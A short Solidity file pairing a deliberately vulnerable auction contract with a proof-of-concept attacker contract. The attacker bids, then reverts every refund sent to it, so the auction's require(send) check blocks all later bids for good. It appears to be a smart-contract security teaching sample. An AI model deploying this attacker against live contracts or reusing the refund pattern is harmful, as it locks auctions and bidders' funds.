pragma solidity ^0.4.10;

contract Auction {
    address public currentLeader;
    uint256 public highestBid;

    function bid() public payable {
        require(msg.value > highestBid);
        require(currentLeader.send(highestBid));
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract POC {
    address public owner;
    Auction public auInstance;

    function POC() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    function setInstance(address addr) public onlyOwner {
        auInstance = Auction(addr);
    }

    function attack() public payable onlyOwner {
        auInstance.bid.value(msg.value)();
    }

    function() external payable {
        revert();
    }
}

